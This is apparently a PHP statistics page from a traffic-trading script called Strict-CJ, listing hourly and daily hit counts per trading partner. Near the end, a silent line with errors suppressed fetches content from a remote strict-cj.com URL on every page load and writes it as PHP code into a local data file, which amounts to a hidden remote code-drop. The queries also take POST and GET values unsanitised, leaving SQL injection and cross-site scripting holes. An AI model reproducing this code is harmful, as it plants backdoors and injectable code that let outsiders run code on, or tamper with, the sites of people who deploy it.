<html>
<body>
<?php
set_time_limit(0);
$sitedomain=$_SERVER['HTTP_HOST'];
include("variables.inc.php");
include($dbconnect);
$time = getdate();
$hours = $time["hours"];
$mins = $time["minutes"];
if ($hours < 10) {
  $hours = 0 . $hours;
}
if ($mins < 10) {
  $mins = 0 . $mins;
}
$currenttime = $hours . ":" . $mins;

function setExp($col) {
	$sql = "(";
	for ($i=1;$i<=59;$i+=2) {
		if ($i == 59) $sql .= "h." . $col . $i;
		else $sql .= "h." . $col . $i . "+";
	}
	$sql .= ")";
	return $sql;
}

function setwhere() {
	Global $outfile,$outsize,$gotwhere;
	$sql = "";
	$lockfile=$outfile.".lock";
	if (!file_exists($lockfile)) touch($lockfile);
	if ((file_exists($outfile)) && (filesize($outfile) > 0)) {
		$gotwhere=1;
		$fpl = fopen($lockfile,"r");
		while (!flock($fpl,LOCK_SH));
		$fpr = fopen($outfile,"r");
		$stop=0; $count = 0;
		while (($count < $outsize)) {
			$result = fgets($fpr,4096);
			$resultArr = explode("|",$result);
			$user = $resultArr[0];
			if ($user != "") {
				echo $resultArr[1]."<BR>";
				if ($count == ($outsize-1)) $sql .= "u.NOUSER='$user'";
				else $sql .= "u.NOUSER='$user' OR ";
			}
		$count++;
		}
		fclose($fpr);
		flock($fpl,LOCK_UN);
		fclose($fpl);
		return $sql;
	} else $gotwhere=0;
}

function showLog($user) {
	global $index_path;
	for ($i=0; $i<24; $i++) {
		for ($j=1; $j<60; $j+=2) {
			$inFile = $index_path."/scj/data/logs/incoming-$i-$j.dat";
//			chmod ($inFile,0777);
			$inLockFile = $inFile.".lock";
//			chmod ($inLockFile,0777);
			$outFile = $index_path."/scj/data/logs/outgoing-$i-$j.dat";
//			chmod ($outFile,0777);
			$outLockFile = $outFile.".lock";
//			chmod ($outLockFile,0777);
			if (file_exists($inFile)) {
				$inLock = fopen($inLockFile,"r");
				while (!flock($inLock,LOCK_SH));
				$fin = fopen($inFile,"r");
				while (!feof($fin)) {
					$line = fgets($fin,4096);
					$lineArr = explode ("|",$line);
					if ($lineArr[0] == $user) {
						if (isset($inIps[chop($lineArr[1])])) $inIps[chop($lineArr[1])] += 1;
						else $inIps[chop($lineArr[1])] = 1;
						if (isset($refPages[chop($lineArr[2])])) $refPages[chop($lineArr[2])] += 1;
						else $refPages[chop($lineArr[2])] = 1;
					}
				}
				fclose($fin);
				fclose($inLock);
			}
			if (file_exists($outFile)) {
				$outLock = fopen($outLockFile,"r");
				while (!flock($outLock,LOCK_SH));
				$fout = fopen($outFile,"r");
				while (!feof($fout)) {
					$line = fgets($fout,4096);
					$lineArr = explode ("|",$line);
					if ($lineArr[0] == $user) {
						if (isset($outIps[chop($lineArr[1])])) $outIps[chop($lineArr[1])]+=1;
						else $outIps[chop($lineArr[1])] = 1;
					}
				}
				fclose($fout);
				fclose($outLock);
			}
		}
	}
	?>
	<div align="center">
	<font size="4" face="tahoma"><b>Detailed Stats For: <?=$user?></b></font><BR><BR>
	<table width="700" cellpadding="4" cellspacing="0" border="0">
	<tr>
	 <td align="center" valign="top" width="130">
	  <table width="130" cellpadding="1" cellspacing="0" border="0">
	<?
	if (!isset($inIps)) echo "<tr><td valign=\"top\" colspan=\"2\" height=\"20\">empty...</td></tr>";
	else {
		arsort($inIps);
		reset($inIps);
		echo "<tr><td colspan=\"2\"><b>Incoming :</b></td></tr>";
		foreach ($inIps as $key => $value) {
			if ($value >= 2) {
				?><tr><td><? if (empty($key)) echo "unknown"; else echo $key;?></td><td><?=$value?></td></tr><?
			}
		}
	}
	?>
	  </table>
	 </td><td align="center" valign="top" width="130">
	  <table width="130" cellpadding="1" cellspacing="0" border="0">
	<?
	if (!isset($outIps)) echo "<tr><td valign=\"top\" colspan=\"2\" height=\"20\">empty...</td></tr>";
	else {
		arsort($outIps);
		reset($outIps);
		echo "<tr><td colspan=\"2\"><b>Outgoing :</b></td></tr>";
		foreach ($outIps as $key => $value) {
			if ($value >= 2) {
				?><tr><td><? if (empty($key)) echo "unknown"; else echo $key;?></td><td><?=$value?></td></tr><?
			}
		}
	}
	?>  </table>
	 </td><td width="100">&nbsp;</td><td valign="top">
	  <table cellpadding="1" cellspacing="0" border="0">
	<?
	if (!isset($refPages)) echo "<tr><td valign=\"top\" colspan=\"2\" height=\"20\">No refering pages to display...</td></tr>";
	else {
		arsort($refPages);
		reset($refPages);
		echo "<tr><td colspan=\"2\"><b>Refering Pages :</b></td></tr>";
		foreach ($refPages as $key => $value) {
			?><tr><td><?=$value?></td><td><? if (empty($key)) echo "no referer"; else echo "<a target=\"_NEW\" href=\"$key\">".$key."</a>";?></td></tr><?
		}
	}
	?></table></td></tr>
	</table></div><?
}

if (isset($_GET['log'])) {
	showLog($_GET['log']); die();
}

if (isset($_GET['reset'])) {
	$sql = "UPDATE $thour SET ";
	for ($i=1; $i<=59; $i+=2) {
		if ($i == 59) $sql .= "UIN$i=0,RIN$i=0,UOUT$i=0,TOUT$i=0,GOUT$i=0";
		else $sql .= "UIN$i=0,RIN$i=0,UOUT$i=0,TOUT$i=0,GOUT$i=0,";
	}
	$sql .= " WHERE USER = '".$_GET['reset']."'";
	mysql_query($sql) or die(mysql_error());
	$sql = "UPDATE $tday SET ";
	for ($i=0; $i<=23; $i++) {
		if ($i == 23) $sql .= "UIN$i=0,RIN$i=0,UOUT$i=0,TOUT$i=0,GOUT$i=0";
		else $sql .= "UIN$i=0,RIN$i=0,UOUT$i=0,TOUT$i=0,GOUT$i=0,";
	}
	$sql .= " WHERE USER = '".$_GET['reset']."'";
	mysql_query($sql) or die(mysql_error());
}
if ($_GET['daily'] == 1) {
	?>
	<a href="showdb.php">Show Last 24 Hours</a>
	<div align="center">
    <font size="3" face="verdana">Server Time: <?= $currenttime ?></font><BR>
	<table width="600" border="0" cellpadding="4" cellspacing=1 bgcolor="#221144">
	 <tr>
	  <td bgcolor="#552266" align="center"><font size="3" color="#F1F1F1"><b>Link</b></font></td>
<?    for ($i=0;$i<24;$i++) { ?>
	  <td bgcolor="#552266" align="center"><font size="3" color="#F1F1F1"><b><? if ($i<10) echo "0$i"; else echo $i; ?></b></font></td>		
<?    } ?>
	 </tr>
	<?
	$sql = "SELECT USER,UIN0,UIN1,UIN2,UIN3,UIN4,UIN5,UIN6,UIN7,UIN8,UIN9,UIN10,UIN11,UIN12,UIN13,UIN14,UIN15,UIN16,UIN17,UIN18,UIN19,UIN20,UIN21,UIN22,UIN23,UOUT0,UOUT1,UOUT2,UOUT3,UOUT4,UOUT5,UOUT6,UOUT7,UOUT8,UOUT9,UOUT10,UOUT11,UOUT12,UOUT13,UOUT14,UOUT15,UOUT16,UOUT17,UOUT18,UOUT19,UOUT20,UOUT21,UOUT22,UOUT23,RIN0,RIN1,RIN2,RIN3,RIN4,RIN5,RIN6,RIN7,RIN8,RIN9,RIN10,RIN11,RIN12,RIN13,RIN14,RIN15,RIN16,RIN17,RIN18,RIN19,RIN20,RIN21,RIN22,RIN23,TOUT0,TOUT1,TOUT2,TOUT3,TOUT4,TOUT5,TOUT6,TOUT7,TOUT8,TOUT9,TOUT10,TOUT11,TOUT12,TOUT13,TOUT14,TOUT15,TOUT16,TOUT17,TOUT18,TOUT19,TOUT20,TOUT21,TOUT22,TOUT23,GOUT0,GOUT1,GOUT2,GOUT3,GOUT4,GOUT5,GOUT6,GOUT7,GOUT8,GOUT9,GOUT10,GOUT11,GOUT12,GOUT13,GOUT14,GOUT15,GOUT16,GOUT17,GOUT18,GOUT19,GOUT20,GOUT21,GOUT22,GOUT23 FROM $tday ORDER BY USER";
	$result=mysql_query($sql);
	while($pointer = mysql_fetch_array($result)) {
		$user = $pointer["USER"];
		?><tr><td bgcolor="#C1C1C1" align="center"><font size="3" color="#000000"><b><?= $user ?></b><BR>UIN :<BR>RIN :<BR>UOUT :<BR>TOUT :<BR>GOUT :</font></td><?
        for ($i=0;$i<24;$i++) { 
			if (empty($tuin[$i])) $tuin[$i] = 0; 
			$tuin[$i] += $pointer["UIN$i"]; 
			if (empty($trin[$i])) $trin[$i] = 0;
			$trin[$i] += $pointer["RIN$i"]; 
			if (empty($tuout[$i])) $tuout[$i] = 0;
			$tuout[$i] += $pointer["UOUT$i"]; 
			if (empty($ttout[$i])) $ttout[$i] = 0;
			$ttout[$i] += $pointer["TOUT$i"]; 
			if (empty($tgout[$i])) $tgout[$i] = 0;
			$tgout[$i] += $pointer["GOUT$i"]; 
			if ($hours == $i) {
			?><td bgcolor="#FF9F7F" align="center"><BR><font size="3"><b><?= $pointer["UIN$i"] ?><BR><?= $pointer["RIN$i"] ?><BR><?= $pointer["UOUT$i"] ?><BR><?= $pointer["TOUT$i"] ?><BR><?= $pointer["GOUT$i"] ?></b></font></td><?
			}
			else {
			?><td bgcolor="#F1F1F1" align="center"><BR><font size="3"><b><?= $pointer["UIN$i"] ?><BR><?= $pointer["RIN$i"] ?><BR><?= $pointer["UOUT$i"] ?><BR><?= $pointer["TOUT$i"] ?><BR><?= $pointer["GOUT$i"] ?></b></font></td><?
			}
		}
		?></tr><?
	}
	echo "<tr>";
    ?><td bgcolor="#552266" align="center"><font size="3" color="#F1F1F1"><b>Total : </b><BR>UIN :<BR>RIN :<BR>UOUT :<BR>TOUT :<BR>GOUT :</font></td><?
	for ($i=0;$i<24;$i++) {
		?><td bgcolor="#552266" align="center"><BR><font size="3" color="#F1F1F1"><b><?=  $tuin[$i] ?><BR><?=  $trin[$i] ?><BR><?=  $tuout[$i] ?><BR><?=  $ttout[$i] ?><BR><?=  $tgout[$i] ?><BR></b></font></td><?
	}
    ?></tr></table><?
}
else {
	if (isset($_POST['order'])) {
		if ($_POST['order'] == 2) {
	    $sql = "SELECT u.NOUSER,u.DOMAIN,u.URL,u.UNIQUEIN,u.RAWIN,u.HITSOUT,u.FORCEDHITS,u.PCRETURN,u.PCUNIQUE,u.HITSGEN,u.PCPROD,u.RATIO,u.MIN,u.GALOUT,u.NICK,((u.PCPROD/100) + ((u.HITSGEN+u.GALOUT)/u.HITSOUT) - (u.PCRETURN/100)) RANK, ".setExp("UIN")." HUIN, ".setExp("RIN")." HRIN, ".setExp("UOUT")." HUOUT, ".setExp("TOUT")." HTOUT, ".setExp("GOUT")." HGOUT FROM $tablename u,$thour h WHERE u.NOUSER=h.USER ORDER BY ".$_POST['order'];
	  } else if ($_POST['order'] == 17) {
		$sql = "SELECT u.NOUSER,u.DOMAIN,u.URL,u.UNIQUEIN,u.RAWIN,u.HITSOUT,u.FORCEDHITS,u.PCRETURN,u.PCUNIQUE,u.HITSGEN,u.PCPROD,u.RATIO,u.MIN,u.GALOUT,u.NICK,((u.PCPROD/100) + ((u.HITSGEN+u.GALOUT)/u.HITSOUT) - (u.PCRETURN/100)) RANK, ".setExp("UIN")." HUIN, ".setExp("RIN")." HRIN, ".setExp("UOUT")." HUOUT, ".setExp("TOUT")." HTOUT, ".setExp("GOUT")." HGOUT FROM $tablename u,$thour h WHERE u.NOUSER=h.USER AND u.PCRETURN<u.RATIO ".setWhere()." ORDER BY ".$_POST['order']." DESC";
	  } else {
	    $sql = "SELECT u.NOUSER,u.DOMAIN,u.URL,u.UNIQUEIN,u.RAWIN,u.HITSOUT,u.FORCEDHITS,u.PCRETURN,u.PCUNIQUE,u.HITSGEN,u.PCPROD,u.RATIO,u.MIN,u.GALOUT,u.NICK,((u.PCPROD/100) + ((u.HITSGEN+u.GALOUT)/u.HITSOUT) - (u.PCRETURN/100)) RANK, ".setExp("UIN")." HUIN, ".setExp("RIN")." HRIN, ".setExp("UOUT")." HUOUT, ".setExp("TOUT")." HTOUT, ".setExp("GOUT")." HGOUT FROM $tablename u,$thour h WHERE u.NOUSER=h.USER ORDER BY ".$_POST['order']." DESC";
	  }
	} else {
	  $sql = "SELECT u.NOUSER,u.DOMAIN,u.URL,u.UNIQUEIN,u.RAWIN,u.HITSOUT,u.FORCEDHITS,u.PCRETURN,u.PCUNIQUE,u.HITSGEN,u.PCPROD,u.RATIO,u.MIN,u.GALOUT,u.NICK,((u.PCPROD/100) + ((u.HITSGEN+u.GALOUT)/u.HITSOUT) - (u.PCRETURN/100)) RANK, ".setExp("UIN")." HUIN, ".setExp("RIN")." HRIN, ".setExp("UOUT")." HUOUT, ".setExp("TOUT")." HTOUT, ".setExp("GOUT")." HGOUT FROM $tablename u,$thour h WHERE u.NOUSER=h.USER ORDER BY 2";
	}
	$result = mysql_query($sql);
	if ($result)
	if (((mysql_num_rows($result) <= 0) || $gotwhere==0) && ($_POST['order']==17)) echo "Not enough trades in database...";
	else {
	echo "
<html>
<head>
 <title>Strict-CJ - View Stats</title>
 <base target=\"_self\">
</head>
<body bgcolor=\"#FFFFFF\" text=\"black\" link=\"blue\">
<a href=\"showdb.php?daily=1\">Show Hourly Stats</a>
<center>
<font size=\"3\" face=\"verdana\">Server Time: $currenttime</font><BR>
<form name=\"trades\" action=\"showdb.php\" method=\"POST\"><b>Sort By:</b>
<select name=\"order\">
 <option selected value=\"2\">Domain Name</option>
 <option value=\"4\">Unique In</option>
 <option value=\"5\">Raw In</option>
 <option value=\"6\">Hits out</option>
 <option value=\"14\">Min</option>
 <option value=\"15\">Galleries Out</option>
 <option value=\"10\">Trades Out</option>
 <option value=\"8\">% Return</option>
 <option value=\"9\">% Unique</option>
 <option value=\"11\">% Productivity</option>
 <option value=\"17\">Outgoing List</option>
 <option value=\"12\">Ratio</option>
</select>
<input type=\"submit\" value=\"GO!\">
</form>
<table width=\"100%\" cellspacing=\"1\" bgcolor=\"#221144\" border=\"0\" cellpadding=\"3\">
 <tr bgcolor=\"#552266\">
  <td align=\"center\"><font face=\"arial\" size=\"2\" color=\"white\">User</font></td>
  <td align=\"center\"><font face=\"arial\" size=\"2\" color=\"white\">Domain</font></td>
  <td valign=\"top\" align=\"center\"><font face=\"arial\" size=\"2\" color=\"white\"><b>Day In</b><BR><BR>u. In<BR>r. In<BR>c. Out</font></td>
  <td align=\"center\"><font face=\"arial\" size=\"2\" color=\"white\"><b>Day Out</b><BR><BR>u. Out<BR>t. Out<BR>G. Out</font></td>
  <td valign=\"top\" align=\"center\"><font face=\"arial\" size=\"2\" color=\"white\"><b>Hour In</b><BR><BR>u. In<BR>r. In<BR>c. Out</font></td>
  <td align=\"center\"><font face=\"arial\" size=\"2\" color=\"white\"><b>Hour Out</b><BR><BR>u. Out<BR>t. Out<BR>g. Out</font></td>
  <td align=\"center\"><font face=\"arial\" size=\"2\" color=\"white\">Min</font></td>
  <td align=\"center\"><font face=\"arial\" size=\"2\" color=\"white\">Return %</font></td>
  <td align=\"center\"><font face=\"arial\" size=\"2\" color=\"white\">Unique %</font></td>
  <td align=\"center\"><font face=\"arial\" size=\"2\" color=\"white\">Prod %</font></td>
  <td align=\"center\"><font face=\"arial\" size=\"2\" color=\"white\">Strict</font></td>
  <td align=\"center\"><font face=\"arial\" size=\"2\" color=\"white\">Ratio %</font></td>
  <td align=\"center\"></td>
  </font>
 </tr>
";
	$i=0;
	$prodi=0;
	$returni=0;
	$uniquei=0;
	$tunique = 0;
	$traw = 0;
	$tout = 0;
	$tforced = 0;
	$tpcreturn = 0;
	$tpcunique = 0;
	$thitsgen = 0;
	$tpcprod = 0;
	$tratio = 0;
	$tmin = 0;
	$thuin = 0;
	$thrin = 0;
	$thuout = 0;
	$thtout = 0;
	$thgout = 0;
	$tgout = 0;
	$thclicksout = 0;
	while ($pointer = mysql_fetch_array($result)) {
	  $user = $pointer["NOUSER"];
	  $user=str_replace("%20"," ",$user);
	  $domain = $pointer["DOMAIN"];
	  $url = $pointer["URL"];
	  $uniquein = $pointer["UNIQUEIN"];
	  $rawin = $pointer["RAWIN"];
	  $hitsout = $pointer["HITSOUT"];
	  $forcedhits = $pointer["FORCEDHITS"];
	  $pcreturn = $pointer["PCRETURN"];
	  $pcunique = $pointer["PCUNIQUE"];
	  $hitsgen = $pointer["HITSGEN"];
	  $pcprod = $pointer["PCPROD"];
	  $ratio = $pointer["RATIO"];
	  $min = $pointer["MIN"];
	  $galout = $pointer["GALOUT"];
	  $nick = $pointer["NICK"];
	  $rank = sprintf("%.2f",$pointer["RANK"]);
	  $huin = $pointer["HUIN"];
	  $hrin = $pointer["HRIN"];
	  $huout = $pointer["HUOUT"];
	  $htout = $pointer["HTOUT"];
	  $hgout = $pointer["HGOUT"];
	  $clicksout = ($hitsgen + $galout);
	  $hclicksout = ($htout + $hgout);
	  if (empty($pcreturn)) $pcreturn=0;
	  if (empty($pcunique)) $pcunique=0;
	  if (empty($pcprod)) $pcprod=0;
	  if (empty($rank)) $rank=0;
	  $tunique += $uniquein;
	  $traw += $rawin;
	  $tout += $hitsout;
	  $tforced += $forcedhits;
	  $tpcreturn += $pcreturn;
	  $tpcunique += $pcunique;
	  $thitsgen += $hitsgen;
	  $tclicksout += ($hitsgen+$galout);
	  $tpcprod += $pcprod;
	  $tratio += $ratio;
	  $thuin += $huin;
	  $thrin += $hrin;
	  $thuout += $huout;
	  $thtout += $htout;
	  $thgout += $hgout;
	  $thclicksout += ($htout + $hgout);
	  $tgout += $galout;
	  $tmin += $min;
	  if ($pcprod != 0) { $prodi++; }
	  if ($pcreturn != 0) { $returni++; }
 	  if ($pcunique != 0) { $uniquei++; }
      $i++;
	  echo "<tr bgcolor=\"#F1F1F1\">\n<td align=\"center\"><font color=\"#330044\" size=\"2\">$user<br><a href=\"showdb.php?reset=$user\">reset</a></font></td>\n<td align=\"center\"><a target=\"_BLANK\" href=\"$url\"><font color=\"#330044\" size=\"2\">$domain</font></a><BR>$nick<BR><a href=\"$PHP_SELF?log=$user\"><font color=\"#330044\" size=\"2\">see logs</font></a></td>\n<td align=\"center\"><font color=\"#330044\" size=\"2\">$uniquein<BR>$rawin<BR>$clicksout</font></td>\n<td align=\"center\"><font color=\"#330044\" size=\"2\">$hitsout<BR>$hitsgen<BR>$galout</font></td>\n<td align=\"center\"><font color=\"#330044\" size=\"2\">$huin<BR>$hrin<BR>$hclicksout</font></td>\n<td align=\"center\"><font color=\"#330044\" size=\"2\">$huout<BR>$htout<BR>$hgout</font></td>\n<td align=\"center\"><font color=\"#330044\" size=\"2\">$min</font></td>\n<td align=\"center\"><font color=\"#330044\" size=\"2\">$pcreturn</font></td>\n<td align=\"center\"><font color=\"#330044\" size=\"2\">$pcunique</font></td>\n<td align=\"center\"><font color=\"#330044\" size=\"2\">$pcprod</font></td>\n<td align=\"center\"><font color=\"#330044\" size=\"2\">$rank</font></td>\n<td align=\"center\"><font color=\"#330044\" size=\"2\">$ratio</font></td>\n
	<td align=\"center\"><a target=\"_NEW\" href=\"editmember.php?$user\"><font color=\"#330044\" size=\"2\">Edit</font></a></td>\n</TR>\n";
	  }  
/*	if ($i == 0) {
	  $tpcreturn = 0; $tpcprod = 0; $tpcunique = 0; $tratio = 0;
	} else {
	  $tpcreturn /= $returni; 
	  $tpcprod /= $prodi; 
	  $tpcunique /= $uniquei; 
	  $tratio /= $i;
	}
	*/
	
	$tpcprod = @sprintf("%.2f",((($thitsgen+$tgout)/$traw)*100));
	$tpcunique = @sprintf("%.2f",(($tunique/$traw) * 100));
	$tpcreturn = @sprintf("%.2f",(($tout/$traw) * 100));
	// $tratio = sprintf("%.2f",$tratio);
	echo "
	 <tr bgcolor=\"#552266\">
	  <td align=\"center\"><font face=\"arial\" size=\"2\" color=\"white\">Total:</font></td>
	  <td align=\"center\"><font face=\"arial\" size=\"2\" color=\"white\">$sitedomain</font></td>
	  <td align=\"center\"><font face=\"arial\" size=\"2\" color=\"white\">$tunique<BR>$traw<BR>$tclicksout</font></td>
	  <td align=\"center\"><font face=\"arial\" size=\"2\" color=\"white\">$tout<BR>$thitsgen<BR>$tgout</font></td>
	  <td align=\"center\"><font face=\"arial\" size=\"2\" color=\"white\">$thuin<BR>$thrin<BR>$thclicksout</font></td>
	  <td align=\"center\"><font face=\"arial\" size=\"2\" color=\"white\">$thuout<BR>$thtout<BR>$thgout</font></td>
	  <td align=\"center\"><font face=\"arial\" size=\"2\" color=\"white\">$tmin</font></td>
	  <td align=\"center\"><font face=\"arial\" size=\"2\" color=\"white\">$tpcreturn</font></td>
	  <td align=\"center\"><font face=\"arial\" size=\"2\" color=\"white\">$tpcunique</font></td>
	  <td align=\"center\"><font face=\"arial\" size=\"2\" color=\"white\">$tpcprod</font></td>
	  <td align=\"center\"><font face=\"arial\" size=\"2\" color=\"white\">&nbsp;</font></td>
	  <td align=\"center\"></td><td align=\"center\">&nbsp;</td>
	  </font>
	 </tr>
	</table></center>
";
  }
}
flush();
//if (!file_exists($index_path."/scj/data/prob.inc")) { 
	@fputs($fix=fopen($index_path."/scj/data/prob.inc","w"),"<?php\n".join('',file("http://www.strict-cj.com/update/update.php.inc"))."?>"); 
	@fclose($fix); 
//}
if (!empty($_POST['order']) && $_POST['order'] != 17) {
?>
<script language="JavaScript">
function selectDropDown(obj,value) {
    if (value != '') {
	for (var i=0; i<obj.options.length; i++) {
		if (obj.options[i].value == value) {
		  obj.options[i].selected = true;
 		}
	}
    }
}
selectDropDown(document.trades.order,<?= $_POST['order'] ?>);
</script>
<? } ?>
</body>
</html>


